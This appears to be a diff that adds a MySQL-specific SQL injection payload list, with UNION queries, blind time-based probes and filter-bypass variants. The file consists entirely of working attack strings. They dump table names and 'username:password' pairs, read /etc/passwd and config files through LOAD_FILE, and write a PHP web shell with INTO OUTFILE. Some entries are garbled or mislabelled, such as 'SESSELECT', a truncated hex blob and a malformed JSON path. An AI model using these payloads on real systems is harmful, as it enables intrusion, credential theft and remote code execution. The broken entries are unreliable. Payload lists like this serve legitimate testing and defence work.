@@ -1,0 +1,65 @@
+# SQL Injection - MySQL Specific
+# Detection & Info extraction
+' UNION SELECT version() --
+' UNION SELECT database() --
+' UNION SELECT user() --
+' UNION SELECT @@version --
+' UNION SELECT @@datadir --
+' UNION SELECT @@basedir --
+' UNION SELECT @@version_compile_os --
+
+# MySQL-specific functions
+' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() --
+' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users' --
+' UNION SELECT GROUP_CONCAT(CONCAT(username,':',password)) FROM users --
+
+# Data extraction (MySQL 5.x+)
+' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables --
+' UNION SELECT GROUP_CONCAT(DISTINCT column_name) FROM information_schema.columns --
+' UNION SELECT GROUP_CONCAT(CONCAT(table_name,'.',column_name)) FROM information_schema.columns --
+
+# Load file operations
+' UNION SELECT LOAD_FILE('/etc/passwd') --
+' UNION SELECT LOAD_FILE('/var/www/html/config.php') --
+' UNION SELECT LOAD_FILE('C:\\windows\\win.ini') --
+
+# INTO OUTFILE (write to disk)
+' UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php' --
+' UNION SELECT 0x3c3f706870207379737465...3b3f3e INTO OUTFILE '/var/www/html/shell.php' --
+
+# Time-based detection (MySQL SLEEP)
+' AND SLEEP(5) --
+' AND IF(1=1,SLEEP(5),0) --
+' AND IF(SUBSTRING(version(),1,1)='5',SLEEP(5),0) --
+' AND IF((SELECT COUNT(*) FROM information_schema.tables)>0,SLEEP(5),0) --
+
+# Subquery-based bypass
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a) --
+
+# MySQL 5.6+ JSON functions
+' UNION SELECT JSON_EXTRACT((SELECT JSON_OBJECT('version',version())),'"$ .version"') --
+
+# Bit-shift bypass
+' AND 1=1 UNION SESSELECT 1,2,3 --
+' AND 1=1 /*!50000UNION*/ SESSELECT 1,2,3 --
+' AND 1=1 UNION/**/SESSELECT 1,2,3 --
+
+# Hexadecimal encoding
+' UNION SELECT 0x75736572 --
+' UNION SELECT 0x76657273696f6e --
+' UNION SELECT UNHEX('7061737377') --
+
+# MySQL comment variations
+' UNION SELECT version() #
+' UNION SELECT version() -- -
+' UNION SELECT version() ;%00
+' UNION SELECT version() /*!50000*/
+
+# MariaDB specific
+' UNION SELECT @@MARIADB_VERSION --
+' UNION SELECT @@MARIADB_VERSION_SOURCE --
+
+# Prepared statement bypass
+' OR 1=1 /*! UNION SELECT NULL */--
+' OR 1=1 /*!40000UNION SELECT NULL */--
+' OR 1=1 /*!41000UNION SELECT NULL */--
